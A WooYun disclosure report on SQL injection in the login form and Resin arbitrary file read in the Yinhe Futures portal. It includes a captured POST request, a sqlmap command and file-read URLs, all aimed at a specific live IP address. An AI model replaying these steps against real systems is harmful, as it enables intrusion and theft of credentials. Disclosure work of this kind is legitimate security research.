wybug_title: 银河期货某门户系统漏洞打包
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-05-14：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-06-28：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 1#sql注射2#任意文件读取 详细说明：  站点地址：
http://101.231.52.2:8888/login/Login.jsp?logintype=&gopage=&languageid=7&message=18
银河期货信息门户，即OA

我是从官网上跳转过来的

说一说问题：首先是sql注射，该系统的登录模块存在登录框post注入登录抓包
POST http://101.231.52.2:8888/login/VerifyLogin.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://101.231.52.2:8888/wui/theme/ecology7/page/login.jsp?templateId=21&logintype=1&gopage=&languageid=7&message=17Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: 101.231.52.2:8888Content-Length: 255Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=abctB1seLYUeRd_AhHP0u; testBanCookie=testloginfile=%2Fwui%2Ftheme%2Fecology7%2Fpage%2Flogin.jsp%3FtemplateId%3D21%26logintype%3D1%26gopage%3D&logintype=1&fontName=%CE%A2%C8%ED%D1%C5%BA%DA&message=17&gopage=&formmethod=post&rnd=&serial=&username=&isie=true&loginid=admin&userpassword=admin&submit=
放入sqlmap
python SQLMap/SQLMap.py -r 2.txt --time-sec 6 --current-db

Parameter: loginid (POST)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind




1000余张表，望山跑死马，点到为止   漏洞证明：  问题2#任意文件读取-resinhttp://101.231.52.2:8888/resin-doc/viewfile/?file=index.jsp

http://101.231.52.2:8888/resin-doc/examples/security-basic/viewfile?file=WEB-INF/password.xml

以上   修复方案：  过滤，正确配置resin   版权声明：转载请注明来源 茜茜公主@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
